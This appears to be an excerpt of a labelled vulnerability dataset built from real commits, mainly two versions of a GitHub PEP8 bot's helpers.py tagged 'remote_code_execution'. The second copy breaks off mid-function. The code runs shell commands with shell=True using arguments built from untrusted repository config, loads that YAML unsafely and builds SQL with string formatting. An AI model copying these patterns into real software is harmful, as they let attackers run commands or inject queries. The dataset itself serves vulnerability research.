        self.terminal.reset_mock()
        self.oms_ssh.handle_TAB()

        eq_(self.terminal.method_calls, [('write', ('',), {}), ('nextLine', (), {}), ('write', ('help  hello\n',), {}), ('write', (self.oms_ssh.ps[0] + 'hel',), {})])

    def test_spaces_between_arg(self):
        self._tab_after('ls comp')
        eq_(self.terminal.method_calls, [('write', ('utes ',), {})])

    def test_command_arg_spaces_before_command(self):
        self._tab_after(' ls comp')
        eq_(self.terminal.method_calls, [('write', ('utes ',), {})])

    def test_mandatory_positional(self):
        self._tab_after('cat ')
        eq_(len(self.terminal.method_calls), 4)

    def test_complete_switches(self):
        self._tab_after('quit ')
        eq_(len(self.terminal.method_calls), 0)

        # hit tab twice
        self.oms_ssh.handle_TAB()
        eq_(len(self.terminal.method_calls), 0)

        # now try with a dash
        self._tab_after('-')
        eq_(self.terminal.method_calls, [('write', ('',), {}), ('nextLine', (), {}), ('write', ('-h  --help\n',), {}), ('write', (self.oms_ssh.ps[0] + 'quit -',), {})])
        # disambiguate
        self._tab_after('-')
        eq_(self.terminal.method_calls, [('write', ('help ',), {})])

    def test_complete_consumed_switches(self):
        self._tab_after('ls --help')
        eq_(self.terminal.method_calls, [('write', (' ',), {})])

        self._tab_after('-')
        assert 'help' not in self.terminal.method_calls[2][1][0]
        assert '-h' not in self.terminal.method_calls[2][1][0]
/n/n/n",1,path_disclosure
0,16,e09ec28786aa04bb7a6459fec6294bbb9368671a,"pep8speaks/helpers.py/n/n# -*- coding: utf-8 -*-

import base64
import collections
import datetime
import hmac
import json
import os
import re
import subprocess
import time

import psycopg2
import requests
import unidiff
import yaml
from flask import abort


def update_users(repository):
    """"""Update users of the integration in the database""""""
    if os.environ.get(""OVER_HEROKU"", False) is not False:
        # Check if repository exists in database
        query = r""INSERT INTO Users (repository, created_at) VALUES ('{}', now());"" \
                """".format(repository)

        try:
            cursor.execute(query)
            conn.commit()
        except psycopg2.IntegrityError:  # If already exists
            conn.rollback()


def follow_user(user):
    """"""Follow the user of the service""""""
    headers = {
        ""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""],
        ""Content-Length"": ""0"",
    }
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    url = ""https://api.github.com/user/following/{}""
    url = url.format(user)
    r = requests.put(url, headers=headers, auth=auth)


def update_dict(base, head):
    """"""
    Recursively merge or update dict-like objects.
    >>> update({'k1': 1}, {'k1': {'k2': {'k3': 3}}})

    Source : http://stackoverflow.com/a/32357112/4698026
    """"""
    for key, value in head.items():
        if key in base:
            if isinstance(base, collections.Mapping):
                if isinstance(value, collections.Mapping):
                    base[key] = update_dict(base.get(key, {}), value)
                else:
                    base[key] = head[key]
            else:
                base = {key: head[key]}
    return base


def match_webhook_secret(request):
    """"""Match the webhook secret sent from GitHub""""""
    if os.environ.get(""OVER_HEROKU"", False) is not False:
        header_signature = request.headers.get('X-Hub-Signature')
        if header_signature is None:
            abort(403)
        sha_name, signature = header_signature.split('=')
        if sha_name != 'sha1':
            abort(501)
        mac = hmac.new(os.environ[""GITHUB_PAYLOAD_SECRET""].encode(), msg=request.data,
                       digestmod=""sha1"")
        if not hmac.compare_digest(str(mac.hexdigest()), str(signature)):
            abort(403)
    return True


def check_pythonic_pr(data):
    """"""
    Return True if the PR contains at least one Python file
    """"""
    files = list(get_files_involved_in_pr(data).keys())
    pythonic = False
    for file in files:
        if file[-3:] == '.py':
            pythonic = True
            break

    return pythonic


def get_config(data):
    """"""
    Get .pep8speaks.yml config file from the repository and return
    the config dictionary
    """"""

    # Default configuration parameters
    config = {
        ""message"": {
            ""opened"": {
                ""header"": """",
                ""footer"": """"
            },
            ""updated"": {
                ""header"": """",
                ""footer"": """"
            }
        },
        ""scanner"": {""diff_only"": False},
        ""pycodestyle"": {
            ""ignore"": [],
            ""max-line-length"": 79,
            ""count"": False,
            ""first"": False,
            ""show-pep8"": False,
            ""filename"": [],
            ""exclude"": [],
            ""select"": [],
            ""show-source"": False,
            ""statistics"": False,
            ""hang-closing"": False,
        },
        ""no_blank_comment"": True,
        ""only_mention_files_with_errors"": True,
    }

    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])

    # Configuration file
    url = ""https://raw.githubusercontent.com/{}/{}/.pep8speaks.yml""

    url = url.format(data[""repository""], data[""after_commit_hash""])
    r = requests.get(url, headers=headers, auth=auth)
    if r.status_code == 200:
        try:
            new_config = yaml.load(r.text)
            # overloading the default configuration with the one specified
            config = update_dict(config, new_config)
        except yaml.YAMLError:  # Bad YAML file
            pass

    # Create pycodestyle command line arguments
    arguments = []
    confs = config[""pycodestyle""]
    for key, value in confs.items():
        if value:  # Non empty
            if isinstance(value, int):
                if isinstance(value, bool):
                    arguments.append(""--{}"".format(key))
                else:
                    arguments.append(""--{}={}"".format(key, value))
            elif isinstance(value, list):
                arguments.append(""--{}={}"".format(key, ','.join(value)))
    config[""pycodestyle_cmd_config""] = ' {arguments}'.format(arguments=' '.join(arguments))

    # pycodestyle is case-sensitive
    config[""pycodestyle""][""ignore""] = [e.upper() for e in list(config[""pycodestyle""][""ignore""])]

    return config


def get_files_involved_in_pr(data):
    """"""
    Return a list of file names modified/added in the PR
    """"""
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    diff_headers = headers.copy()
    diff_headers[""Accept""] = ""application/vnd.github.VERSION.diff""
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    repository = data[""repository""]
    after_commit_hash = data[""after_commit_hash""]
    author = data[""author""]
    diff_url = ""https://api.github.com/repos/{}/pulls/{}""
    diff_url = diff_url.format(repository, str(data[""pr_number""]))
    r = requests.get(diff_url, headers=diff_headers, auth=auth)
    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)

    files = {}

    for patchset in patch:
        file = patchset.target_file[1:]
        files[file] = []
        for hunk in patchset:
            for line in hunk.target_lines():
                if line.is_added:
                    files[file].append(line.target_line_no)

    return files


def get_python_files_involved_in_pr(data):
    files = get_files_involved_in_pr(data)
    for file in list(files.keys()):
        if file[-3:] != "".py"":
            del files[file]

    return files


def run_pycodestyle(data, config):
    """"""
    Run pycodestyle script on the files and update the data
    dictionary
    """"""
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    repository = data[""repository""]
    after_commit_hash = data[""after_commit_hash""]
    author = data[""author""]

    # Run pycodestyle
    ## All the python files with additions
    # A dictionary with filename paired with list of new line numbers
    py_files = get_python_files_involved_in_pr(data)

    for file in py_files:
        filename = file[1:]
        url = ""https://raw.githubusercontent.com/{}/{}/{}""
        url = url.format(repository, after_commit_hash, file)
        r = requests.get(url, headers=headers, auth=auth)
        with open(""file_to_check.py"", 'w+', encoding=r.encoding) as file_to_check:
            file_to_check.write(r.text)

        # Use the command line here
        cmd = 'pycodestyle {config[pycodestyle_cmd_config]} file_to_check.py'.format(
            config=config)
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        stdout, _ = proc.communicate()
        data[""extra_results""][filename] = stdout.decode(r.encoding).splitlines()

        # Put only relevant errors in the data[""results""] dictionary
        data[""results""][filename] = []
        for error in list(data[""extra_results""][filename]):
            if re.search(""^file_to_check.py:\d+:\d+:\s[WE]\d+\s.*"", error):
                data[""results""][filename].append(error.replace(""file_to_check.py"", filename))
                data[""extra_results""][filename].remove(error)

        ## Remove errors in case of diff_only = True
        ## which are caused in the whole file
        for error in list(data[""results""][filename]):
            if config[""scanner""][""diff_only""]:
                if not int(error.split("":"")[1]) in py_files[file]:
                    data[""results""][filename].remove(error)

        ## Store the link to the file
        url = ""https://github.com/{}/blob/{}{}""
        data[filename + ""_link""] = url.format(repository, after_commit_hash, file)
        os.remove(""file_to_check.py"")


def prepare_comment(request, data, config):
    """"""Construct the string of comment i.e. its header, body and footer""""""
    author = data[""author""]
    # Write the comment body
    ## Header
    comment_header = """"
    if request.json[""action""] == ""opened"":
        if config[""message""][""opened""][""header""] == """":
            comment_header = ""Hello @"" + author + ""! Thanks for submitting the PR.\n\n""
        else:
            comment_header = config[""message""][""opened""][""header""] + ""\n\n""
    elif request.json[""action""] in [""synchronize"", ""reopened""]:
        if config[""message""][""updated""][""header""] == """":
            comment_header = ""Hello @"" + author + ""! Thanks for updating the PR.\n\n""
        else:
            comment_header = config[""message""][""updated""][""header""] + ""\n\n""

    ## Body
    ERROR = False  # Set to True when any pep8 error exists
    comment_body = []
    for file, issues in data[""results""].items():
        if len(issues) == 0:
            if not config[""only_mention_files_with_errors""]:
                comment_body.append(
                    "" - There are no PEP8 issues in the""
                    "" file [`{0}`]({1}) !"".format(file, data[file + ""_link""]))
        else:
            ERROR = True
            comment_body.append(
                "" - In the file [`{0}`]({1}), following ""
                ""are the PEP8 issues :\n"".format(file, data[file + ""_link""]))
            for issue in issues:
                ## Replace filename with L
                error_string = issue.replace(file + "":"", ""Line "")

                ## Link error codes to search query
                error_string_list = error_string.split("" "")
                code = error_string_list[2]
                code_url = ""https://duckduckgo.com/?q=pep8%20{0}"".format(code)
                error_string_list[2] = ""[{0}]({1})"".format(code, code_url)

                ## Link line numbers in the file
                line, col = error_string_list[1][:-1].split("":"")
                line_url = data[file + ""_link""] + ""#L"" + line
                error_string_list[1] = ""[{0}:{1}]({2}):"".format(line, col, line_url)
                error_string = "" "".join(error_string_list)
                error_string = error_string.replace(""Line ["", ""[Line "")
                comment_body.append(""\n> {0}"".format(error_string))

        comment_body.append(""\n\n"")
        if len(data[""extra_results""][file]) > 0:
            comment_body.append("" - Complete extra results for this file :\n\n"")
            comment_body.append(""> "" + """".join(data[""extra_results""][file]))
            comment_body.append(""---\n\n"")

    if config[""only_mention_files_with_errors""] and not ERROR:
        comment_body.append(""Cheers ! There are no PEP8 issues in this Pull Request. :beers: "")


    comment_body = ''.join(comment_body)


    ## Footer
    comment_footer = []
    if request.json[""action""] == ""opened"":
        comment_footer.append(config[""message""][""opened""][""footer""])
    elif request.json[""action""] in [""synchronize"", ""reopened""]:
        comment_footer.append(config[""message""][""updated""][""footer""])

    comment_footer = ''.join(comment_footer)

    return comment_header, comment_body, comment_footer, ERROR


def comment_permission_check(data, comment):
    """"""Check for quite and resume status or duplicate comments""""""
    PERMITTED_TO_COMMENT = True
    repository = data[""repository""]
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])

    # Check for duplicate comment
    url = ""https://api.github.com/repos/{}/issues/{}/comments""
    url = url.format(repository, str(data[""pr_number""]))
    comments = requests.get(url, headers=headers, auth=auth).json()

    # Get the last comment by the bot
    last_comment = """"
    for old_comment in reversed(comments):
        if old_comment[""user""][""id""] == 24736507:  # ID of @pep8speaks
            last_comment = old_comment[""body""]
            break

    """"""
    # Disabling this because only a single comment is made per PR
    text1 = ''.join(BeautifulSoup(markdown(comment)).findAll(text=True))
    text2 = ''.join(BeautifulSoup(markdown(last_comment)).findAll(text=True))
    if text1 == text2.replace(""submitting"", ""updating""):
        PERMITTED_TO_COMMENT = False
    """"""

    # Check if the bot is asked to keep quiet
    for old_comment in reversed(comments):
        if '@pep8speaks' in old_comment['body']:
            if 'resume' in old_comment['body'].lower():
                break
            elif 'quiet' in old_comment['body'].lower():
                PERMITTED_TO_COMMENT = False


    return PERMITTED_TO_COMMENT


def create_or_update_comment(data, comment):
    comment_mode = None
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])

    query = ""https://api.github.com/repos/{}/issues/{}/comments""
    query = query.format(data[""repository""], str(data[""pr_number""]))
    comments = requests.get(query, headers=headers, auth=auth).json()

    # Get the last comment id by the bot
    last_comment_id = None
    for old_comment in comments:
        if old_comment[""user""][""id""] == 24736507:  # ID of @pep8speaks
            last_comment_id = old_comment[""id""]
            break

    if last_comment_id is None:  # Create a new comment
        response = requests.post(query, json={""body"": comment}, headers=headers, auth=auth)
        data[""comment_response""] = response.json()
    else:  # Update the last comment
        utc_time = datetime.datetime.utcnow()
        time_now = utc_time.strftime(""%B %d, %Y at %H:%M Hours UTC"")
        comment += ""\n\n##### Comment last updated on {}""
        comment = comment.format(time_now)

        query = ""https://api.github.com/repos/{}/issues/comments/{}""
        query = query.format(data[""repository""], str(last_comment_id))
        response = requests.patch(query, json={""body"": comment}, headers=headers, auth=auth)


def autopep8(data, config):
    # Run pycodestyle

    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    r = requests.get(data[""diff_url""], headers=headers, auth=auth)
    ## All the python files with additions
    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)

    # A dictionary with filename paired with list of new line numbers
    py_files = {}

    for patchset in patch:
        if patchset.target_file[-3:] == '.py':
            py_file = patchset.target_file[1:]
            py_files[py_file] = []
            for hunk in patchset:
                for line in hunk.target_lines():
                    if line.is_added:
                        py_files[py_file].append(line.target_line_no)

    # Ignore errors and warnings specified in the config file
    to_ignore = "","".join(config[""pycodestyle""][""ignore""])
    arg_to_ignore = """"
    if len(to_ignore) > 0:
        arg_to_ignore = ""--ignore "" + to_ignore

    for file in py_files:
        filename = file[1:]
        url = ""https://raw.githubusercontent.com/{}/{}/{}""
        url = url.format(data[""repository""], data[""sha""], file)
        r = requests.get(url, headers=headers, auth=auth)
        with open(""file_to_fix.py"", 'w+', encoding=r.encoding) as file_to_fix:
            file_to_fix.write(r.text)

        cmd = 'autopep8 file_to_fix.py --diff {arg_to_ignore}'.format(
            arg_to_ignore=arg_to_ignore)
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        stdout, _ = proc.communicate()
        data[""diff""][filename] = stdout.decode(r.encoding)

        # Fix the errors
        data[""diff""][filename] = data[""diff""][filename].replace(""file_to_check.py"", filename)
        data[""diff""][filename] = data[""diff""][filename].replace(""\\"", ""\\\\"")

        ## Store the link to the file
        url = ""https://github.com/{}/blob/{}{}""
        data[filename + ""_link""] = url.format(data[""repository""], data[""sha""], file)
        os.remove(""file_to_fix.py"")


def create_gist(data, config):
    """"""Create gists for diff files""""""
    REQUEST_JSON = {}
    REQUEST_JSON[""public""] = True
    REQUEST_JSON[""files""] = {}
    REQUEST_JSON[""description""] = ""In response to @{0}'s comment : {1}"".format(
        data[""reviewer""], data[""review_url""])

    for file, diffs in data[""diff""].items():
        if len(diffs) != 0:
            REQUEST_JSON[""files""][file.split(""/"")[-1] + "".diff""] = {
                ""content"": diffs
            }

    # Call github api to create the gist
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    url = ""https://api.github.com/gists""
    res = requests.post(url, json=REQUEST_JSON, headers=headers, auth=auth).json()
    data[""gist_response""] = res
    data[""gist_url""] = res[""html_url""]


def delete_if_forked(data):
    FORKED = False
    url = ""https://api.github.com/user/repos""
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    r = requests.get(url, headers=headers, auth=auth)
    for repo in r.json():
        if repo[""description""]:
            if data[""target_repo_fullname""] in repo[""description""]:
                FORKED = True
                r = requests.delete(""https://api.github.com/repos/""
                                ""{}"".format(repo[""full_name""]),
                                headers=headers, auth=auth)
    return FORKED


def fork_for_pr(data):
    FORKED = False
    url = ""https://api.github.com/repos/{}/forks""
    url = url.format(data[""target_repo_fullname""])
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    r = requests.post(url, headers=headers, auth=auth)
    if r.status_code == 202:
        data[""fork_fullname""] = r.json()[""full_name""]
        FORKED = True
    else:
        data[""error""] = ""Unable to fork""
    return FORKED


def update_fork_desc(data):
    # Check if forked (takes time)
    url = ""https://api.github.com/repos/{}"".format(data[""fork_fullname""])
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    r = requests.get(url, headers=headers, auth=auth)
    ATTEMPT = 0
    while(r.status_code != 200):
        time.sleep(5)
        r = requests.get(url, headers=headers, auth=auth)
        ATTEMPT += 1
        if ATTEMPT > 10:
            data[""error""] = ""Forking is taking more than usual time""
            break

    full_name = data[""target_repo_fullname""]
    author, name = full_name.split(""/"")
    request_json = {
        ""name"": name,
        ""description"": ""Forked from @{}'s {}"".format(author, full_name)
    }
    r = requests.patch(url, data=json.dumps(request_json), headers=headers, auth=auth)
    if r.status_code != 200:
        data[""error""] = ""Could not update description of the fork""


def create_new_branch(data):
    url = ""https://api.github.com/repos/{}/git/refs/heads""
    url = url.format(data[""fork_fullname""])
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    sha = None
    r = requests.get(url, headers=headers, auth=auth)
    for ref in r.json():
        if ref[""ref""].split(""/"")[-1] == data[""target_repo_branch""]:
            sha = ref[""object""][""sha""]

    url = ""https://api.github.com/repos/{}/git/refs""
    url = url.format(data[""fork_fullname""])
    data[""new_branch""] = ""{}-pep8-patch"".format(data[""target_repo_branch""])
    request_json = {
        ""ref"": ""refs/heads/{}"".format(data[""new_branch""]),
        ""sha"": sha,
    }
    r = requests.post(url, json=request_json, headers=headers, auth=auth)

    if r.status_code != 200:
        data[""error""] = ""Could not create new branch in the fork""


def autopep8ify(data, config):
    # Run pycodestyle
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    r = requests.get(data[""diff_url""], headers=headers, auth=auth)

    ## All the python files with additions
    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)

    # A dictionary with filename paired with list of new line numbers
    py_files = {}

    for patchset in patch:
        if patchset.target_file[-3:] == '.py':
            py_file = patchset.target_file[1:]
            py_files[py_file] = []
            for hunk in patchset:
                for line in hunk.target_lines():
                    if line.is_added:
                        py_files[py_file].append(line.target_line_no)

    # Ignore errors and warnings specified in the config file
    to_ignore = "","".join(config[""pycodestyle""][""ignore""])
    arg_to_ignore = """"
    if len(to_ignore) > 0:
        arg_to_ignore = ""--ignore "" + to_ignore

    for file in py_files:
        filename = file[1:]
        url = ""https://raw.githubusercontent.com/{}/{}/{}""
        url = url.format(data[""repository""], data[""sha""], file)
        r = requests.get(url, headers=headers, auth=auth)
        with open(""file_to_fix.py"", 'w+', encoding=r.encoding) as file_to_fix:
            file_to_fix.write(r.text)

        cmd = 'autopep8 file_to_fix.py {arg_to_ignore}'.format(
            arg_to_ignore=arg_to_ignore)
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        stdout, _ = proc.communicate()
        data[""results""][filename] = stdout.decode(r.encoding)

        os.remove(""file_to_fix.py"")


def commit(data):
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])

    fullname = data.get(""fork_fullname"")

    for file, new_file in data[""results""].items():
        url = ""https://api.github.com/repos/{}/contents/{}""
        url = url.format(fullname, file)
        params = {""ref"": data[""new_branch""]}
        r = requests.get(url, params=params, headers=headers, auth=auth)
        sha_blob = r.json().get(""sha"")
        params[""path""] = file
        content_code = base64.b64encode(new_file.encode()).decode(""utf-8"")
        request_json = {
            ""path"": file,
            ""message"": ""Fix pep8 errors in {}"".format(file),
            ""content"": content_code,
            ""sha"": sha_blob,
            ""branch"": data.get(""new_branch""),
        }
        r = requests.put(url, json=request_json, headers=headers, auth=auth)


def create_pr(data):
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    url = ""https://api.github.com/repos/{}/pulls""
    url = url.format(data[""target_repo_fullname""])
    request_json = {
        ""title"": ""Fix pep8 errors"",
        ""head"": ""pep8speaks:{}"".format(data[""new_branch""]),
        ""base"": data[""target_repo_branch""],
        ""body"": ""The changes are suggested by autopep8"",
    }
    r = requests.post(url, json=request_json, headers=headers, auth=auth)
    if r.status_code == 201:
        data[""pr_url""] = r.json()[""html_url""]
    else:
        data[""error""] = ""Pull request could not be created""
/n/n/n",0,remote_code_execution
1,17,e09ec28786aa04bb7a6459fec6294bbb9368671a,"/pep8speaks/helpers.py/n/n# -*- coding: utf-8 -*-

import base64
import collections
import datetime
import hmac
import json
import os
import re
import subprocess
import time

import psycopg2
import requests
import unidiff
import yaml
from flask import abort


def update_users(repository):
    """"""Update users of the integration in the database""""""
    if os.environ.get(""OVER_HEROKU"", False) is not False:
        # Check if repository exists in database
        query = r""INSERT INTO Users (repository, created_at) VALUES ('{}', now());"" \
                """".format(repository)

        try:
            cursor.execute(query)
            conn.commit()
        except psycopg2.IntegrityError:  # If already exists
            conn.rollback()


def follow_user(user):
    """"""Follow the user of the service""""""
    headers = {
        ""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""],
        ""Content-Length"": ""0"",
    }
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    url = ""https://api.github.com/user/following/{}""
    url = url.format(user)
    r = requests.put(url, headers=headers, auth=auth)


def update_dict(base, head):
    """"""
    Recursively merge or update dict-like objects.
    >>> update({'k1': 1}, {'k1': {'k2': {'k3': 3}}})

    Source : http://stackoverflow.com/a/32357112/4698026
    """"""
    for key, value in head.items():
        if isinstance(base, collections.Mapping):
            if isinstance(value, collections.Mapping):
                base[key] = update_dict(base.get(key, {}), value)
            else:
                base[key] = head[key]
        else:
            base = {key: head[key]}
    return base


def match_webhook_secret(request):
    """"""Match the webhook secret sent from GitHub""""""
    if os.environ.get(""OVER_HEROKU"", False) is not False:
        header_signature = request.headers.get('X-Hub-Signature')
        if header_signature is None:
            abort(403)
        sha_name, signature = header_signature.split('=')
        if sha_name != 'sha1':
            abort(501)
        mac = hmac.new(os.environ[""GITHUB_PAYLOAD_SECRET""].encode(), msg=request.data,
                       digestmod=""sha1"")
        if not hmac.compare_digest(str(mac.hexdigest()), str(signature)):
            abort(403)
    return True


def check_pythonic_pr(data):
    """"""
    Return True if the PR contains at least one Python file
    """"""
    files = list(get_files_involved_in_pr(data).keys())
    pythonic = False
    for file in files:
        if file[-3:] == '.py':
            pythonic = True
            break

    return pythonic


def get_config(data):
    """"""
    Get .pep8speaks.yml config file from the repository and return
    the config dictionary
    """"""

    # Default configuration parameters
    config = {
        ""message"": {
            ""opened"": {
                ""header"": """",
                ""footer"": """"
            },
            ""updated"": {
                ""header"": """",
                ""footer"": """"
            }
        },
        ""scanner"": {""diff_only"": False},
        ""pycodestyle"": {
            ""ignore"": [],
            ""max-line-length"": 79,
            ""count"": False,
            ""first"": False,
            ""show-pep8"": False,
            ""filename"": [],
            ""exclude"": [],
            ""select"": [],
            ""show-source"": False,
            ""statistics"": False,
            ""hang-closing"": False,
        },
        ""no_blank_comment"": True,
        ""only_mention_files_with_errors"": True,
    }

    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])

    # Configuration file
    url = ""https://raw.githubusercontent.com/{}/{}/.pep8speaks.yml""

    url = url.format(data[""repository""], data[""after_commit_hash""])
    r = requests.get(url, headers=headers, auth=auth)
    if r.status_code == 200:
        try:
            new_config = yaml.load(r.text)
            # overloading the default configuration with the one specified
            config = update_dict(config, new_config)
        except yaml.YAMLError:  # Bad YAML file
            pass

    # Create pycodestyle command line arguments
    arguments = []
    confs = config[""pycodestyle""]
    for key, value in confs.items():
        if value:  # Non empty
            if isinstance(value, int):
                if isinstance(value, bool):
                    arguments.append(""--{}"".format(key))
                else:
                    arguments.append(""--{}={}"".format(key, value))
            elif isinstance(value, list):
                arguments.append(""--{}={}"".format(key, ','.join(value)))
    config[""pycodestyle_cmd_config""] = ' {arguments}'.format(arguments=' '.join(arguments))

    # pycodestyle is case-sensitive
    config[""pycodestyle""][""ignore""] = [e.upper() for e in list(config[""pycodestyle""][""ignore""])]

    return config


def get_files_involved_in_pr(data):
    """"""
    Return a list of file names modified/added in the PR
    """"""
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    diff_headers = headers.copy()
    diff_headers[""Accept""] = ""application/vnd.github.VERSION.diff""
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    repository = data[""repository""]
    after_commit_hash = data[""after_commit_hash""]
    author = data[""author""]
    diff_url = ""https://api.github.com/repos/{}/pulls/{}""
    diff_url = diff_url.format(repository, str(data[""pr_number""]))
    r = requests.get(diff_url, headers=diff_headers, auth=auth)
    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)

    files = {}

    for patchset in patch:
        file = patchset.target_file[1:]
        files[file] = []
        for hunk in patchset:
            for line in hunk.target_lines():
                if line.is_added:
                    files[file].append(line.target_line_no)

    return files


def get_python_files_involved_in_pr(data):
    files = get_files_involved_in_pr(data)
    for file in list(files.keys()):
        if file[-3:] != "".py"":
            del files[file]

    return files


def run_pycodestyle(data, config):
    """"""
    Run pycodestyle script on the files and update the data
    dictionary
    """"""
    headers = {""Authorization"": ""token "" + os.environ[""GITHUB_TOKEN""]}
    auth = (os.environ[""BOT_USERNAME""], os.environ[""BOT_PASSWORD""])
    repository = data[""repository""]
    after_commit_hash = data[""after_commit_hash""]
    author = data[""author""]

    # Run pycodestyle
    ## All the python files with additions
    # A dictionary with filename paired with list of new line numbers
    py_files = get_python_files_involved_in_pr(data)

    for file in py_files:
        filename = file[1:]
        url = ""https://raw.githubusercontent.com/{}/{}/{}""
        url = url.format(repository, after_commit_hash, file)
        r = requests.get(url, headers=headers, auth=auth)
        with open(""file_to_check.py"", 'w+', encoding=r.encoding) as file_to_check:
            file_to_check.write(r.text)

        # Use the command line here
        cmd = 'pycodestyle {config[pycodestyle_cmd_config]} file_to_check.py'.format(
            config=config)
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        stdout, _ = proc.communicate()
        data[""extra_results""][filename] = stdout.decode(r.encoding).splitlines()

        # Put only relevant errors in the data[""results""] dictionary
        data[""results""][filename] = []
        for error in list(data[""extra_results""][filename]):
            if re.search(""^file_to_check.py:\d+:\d+:\s[WE]\d+\s.*"", error):
                data[""results""][filename].append(error.replace(""file_to_check.py"", filename))
                data[""extra_results""][filename].remove(error)

        ## Remove errors in case of diff_only = True
        ## which are caused in the whole file
        for error in list(data[""results""][filename]):
            if config[""scanner""][""diff_only""]:
                if not int(error.split("":"")[1]) in py_files[file]:
                    data[""results""][filename].remove(error)

        ## Store the link to the file
        url = ""https://github.com/{}/blob/{}{}""
        data[filename + ""_link""] = url.format(repository, after_commit_hash, file)
        os.remove(""file_to_check.py"")


def prepare_comment(request, data, config):
    """"""Construct the string of comment i.e. its header, body and footer""""""
    author = data[""author""]
    # Write the comment body
    ## Header
    comment_header = """"
    if request.json[""action""] == ""opened"":
        if config[""message""][""opened""][""header""] == """":
            comment_header = ""Hello @"" + author + ""! Thanks for submitting the PR.\n\n""
        else:
            comment_header = config[""message""][""opened""][""header""] + ""\n\n""
    elif request.json[""action""] in [""synchronize"", ""reopened""]:
        if config[""message""][""updated""][""header""] == """":
            comment_header = ""Hello @"" + author + ""! Thanks for updating the PR.\n\n""
        else:
            comment_header = config[""message""][""updated""][""header""] + ""\n\n""

    ## Body
    ERROR = False  # Set to True when any pep8 error exists
    comment_body = []
    for file, issues in data[""results""].items():
        if len(issues) == 0:
            if not config[""only_mention_files_with_errors""]:
                comment_body.append(
                    "" - There are no PEP8 issues in the""
                    "" file [`{0}`]({1}) !"".format(file, data[file + ""_link""]))
        else:
            ERROR = True
            comment_body.append(
                "" - In the file [`{0}`]({1}), following ""
                ""are the PEP8 issues :\n"".format(file, data[file + ""_link""]))
            for issue in issues:
                ## Replace filename with L
                error_string = issue.replace(file + "":"", ""Line "")

                ## Link error codes to search query
                error_string_list = error_string.split("" "")
                code = error_string_list[2]
                code_url = ""https://duckduckgo.com/?q=pep8%20{0}"".format(code)
                error_string_list[2] = ""[{0}]({1})"".format(code, code_url)

                ## Link line numbers in the file
                line, col = error_string_list[1][:-1].split("":"")
                line_url = data[file + ""_link""] + ""#L"" + line
                error_string_list[1] = ""[{0}:{1}]({2}):"".format(line, col, line_url)
                error_string = "" "".join(error_string_list)
                error_string = error_string.replace(""Line ["", ""[Line "")
                comment_body.append(""\n> {0}"".format(error_string))

        comment_body.append(""\n\n"")
        if len(data[""extra_results""][file]) > 0:
            comment_body.append("" - Complete extra results for this file :\n\n"")
            comment_body.append(""> "" + """".join(data[""extra_results""][file]))
            comment_body.append(""---\n\n"")

    if config[""only_mention_files_with_errors""] and not ERROR:
        comment_body.append(""Cheers ! There are no PEP8 issues in this Pull Request. :beers: "")


    comment_body = ''.join(comment_body)


    ## Footer
    comment_footer = []
    if request.json[""action""] == ""opened"":
        comment_footer.append(config[""message""][""opened""][""footer""])
    elif request.json[""action""] in [""synchronize"", ""reopened""]:
        comment_footer.append(config[""message""][""updated""][""footer""])

    comment_footer = ''.join(comment_footer)

    return comment_header, comment_body, comment_footer, ERROR


def comment_permission_check(data, comment):
    """"""Check for quite and resume status or duplicate comments""""""
    PERMITTED_TO_COMMENT = True
